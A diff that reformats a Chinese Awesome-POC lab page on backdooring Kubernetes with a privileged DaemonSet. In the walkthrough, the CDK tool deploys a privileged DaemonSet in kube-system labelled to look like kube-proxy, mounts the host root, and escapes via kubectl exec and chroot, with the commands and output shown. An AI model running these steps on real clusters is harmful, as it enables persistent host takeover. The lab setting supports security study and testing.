@@ -8,14 +8,14 @@ DaemonSet 确保全部（或者某些）节点上运行一个 Pod 的副本。 �
 
 参考链接：
 
-- https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/daemonset/
-- https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset
-- https://github.com/cdk-team/CDK/blob/main/test/k8s_exploit_util/backdoor_daemonset.yaml
-- https://github.com/Metarget/metarget
+* https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/daemonset/
+* https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset
+* https://github.com/cdk-team/CDK/blob/main/test/k8s\_exploit\_util/backdoor\_daemonset.yaml
+* https://github.com/Metarget/metarget
 
 ## 环境搭建
 
-基础环境准备（Docker + Minikube + Kubernetes），可参考 [Kubernetes + Ubuntu 18.04 漏洞环境搭建](https://github.com/Threekiii/Awesome-POC/blob/master/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md) 完成。
+基础环境准备（Docker + Minikube + Kubernetes），可参考 [Kubernetes + Ubuntu 18.04 漏洞环境搭建](<Kubernetes + Ubuntu 18.04 漏洞环境搭建.md>) 完成。
 
 本例中各组件版本如下：
 
@@ -42,7 +42,7 @@ NAME                     READY   STATUS    RESTARTS   AGE
 k8s-backdoor-daemonset   1/1     Running   0          9m54s
 ```
 
-![](images/Kubernetes%20部署后门%20Daemonset/image-20250422100649103.png)
+![](../.gitbook/assets/image-20250422100649103.png)
 
 ## 漏洞复现
 
@@ -65,7 +65,7 @@ kubectl exec -n metarget -it k8s-backdoor-daemonset -- /cdk run k8s-backdoor-dae
 {"kind":"DaemonSet","apiVersion":"apps/v1","metadata":{"name":"cdk-backdoor-daemonset","namespace":"kube-system","uid":"ffdf2f2e-e4ce-4938-8ed9-ee7b80753381","resourceVersion":"4619","generation":1,"creationTimestamp":"2025-04-22T02:11:42Z","labels":{"k8s-app":"kube-proxy"},"annotations":{"deprecated.daemonset.template.generation":"1"},"managedFields":[{"manager":"Go-http-client","operation":"Update","apiVersion":"apps/v1","time":"2025-04-22T02:11:42Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:deprecated.daemonset.template.generation":{}},"f:labels":{".":{},"f:k8s-app":{}}},"f:spec":{"f:revisionHistoryLimit":{},"f:selector":{},"f:template":{"f:metadata":{"f:labels":{".":{},"f:k8s-app":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"cdk-backdoor-pod\"}":{".":{},"f:args":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:securityContext":{".":{},"f:capabilities":{".":{},"f:add":{}},"f:privileged":{}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/host-root\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:hostNetwork":{},"f:hostPID":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{},"f:volumes":{".":{},"k:{\"name\":\"host-volume\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}},"f:updateStrategy":{"f:rollingUpdate":{".":{},"f:maxSurge":{},"f:maxUnavailable":{}},"f:type":{}}}}}]},"spec":{"selector":{"matchLabels":{"k8s-app":"kube-proxy"}},"template":{"metadata":{"creationTimestamp":null,"labels":{"k8s-app":"kube-proxy"}},"spec":{"volumes":[{"name":"host-volume","hostPath":{"path":"/","type":""}}],"containers":[{"name":"cdk-backdoor-pod","image":"ubuntu","args":["/bin/sh","-c","touch /tmp/awesome_poc ; sleep 10000"],"resources":{},"volumeMounts":[{"name":"host-volume","mountPath":"/host-root"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"capabilities":{"add":["NET_ADMIN","SYS_ADMIN","SYS_PTRACE","AUDIT_CONTROL","MKNOD","SETFCAP"]},"privileged":true}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","hostNetwork":true,"hostPID":true,"securityContext":{},"schedulerName":"default-scheduler"}},"updateStrategy":{"type":"RollingUpdate","rollingUpdate":{"maxUnavailable":1,"maxSurge":0}},"revisionHistoryLimit":10},"status":{"currentNumberScheduled":0,"numberMisscheduled":0,"desiredNumberScheduled":0,"numberReady":0}}
 ```
 
-![](images/Kubernetes%20部署后门%20Daemonset/image-20250422101155770.png)
+![](../.gitbook/assets/image-20250422101155770.png)
 
 验证部署结果：
 
@@ -75,7 +75,7 @@ kubectl get ds -n kube-system | grep cdk
 cdk-backdoor-daemonset   1         1         1       1            1           <none>                   74s
 ```
 
-![](images/Kubernetes%20部署后门%20Daemonset/image-20250422101313343.png)
+![](../.gitbook/assets/image-20250422101313343.png)
 
 CDK 将宿主机根目录挂载到了 [/host-root](https://github.com/cdk-team/CDK/blob/main/test/k8s_exploit_util/backdoor_daemonset.yaml)，此时我们已经获取了宿主机权限：
 
@@ -85,7 +85,7 @@ kubectl get pods -n kube-system | grep cdk
 cdk-backdoor-daemonset-rvmp9       1/1     Running   0             7m12s
 ```
 
-![](Public/Awesome-POC/云安全漏洞/images/Kubernetes%20部署后门%20Daemonset/image-20250519180051414.png)
+![](../%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Public/Awesome-POC/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/images/Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20Daemonset/image-20250519180051414.png)
 
 ```
 kubectl exec -n kube-system -it cdk-backdoor-daemonset-rvmp9 -- /bin/bash
@@ -99,7 +99,7 @@ root@minikube:/# chroot /host-root
 minikube
 ```
 
-![](Public/Awesome-POC/云安全漏洞/images/Kubernetes%20部署后门%20Daemonset/image-20250519180036573.png)
+![](../%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Public/Awesome-POC/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/images/Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20Daemonset/image-20250519180036573.png)
 
 > 由于我们是在 minikube 上运行 kubernetes，这里逃逸到的是 minikube 虚拟机。
 
@@ -113,7 +113,7 @@ kubectl delete -f k8s_metarget_namespace.yaml
 
 ## YAML
 
-[k8s_metarget_namespace.yaml](https://github.com/Metarget/metarget/blob/master/yamls/k8s_metarget_namespace.yaml)
+[k8s\_metarget\_namespace.yaml](https://github.com/Metarget/metarget/blob/master/yamls/k8s_metarget_namespace.yaml)
 
 ```
 apiVersion: v1
@@ -122,7 +122,7 @@ metadata:
   name: metarget
 ```
 
-[k8s_backdoor_daemonset.yaml](https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/k8s_backdoor_daemonset.yaml)
+[k8s\_backdoor\_daemonset.yaml](https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/k8s_backdoor_daemonset.yaml)
 
 ```
 apiVersion: v1
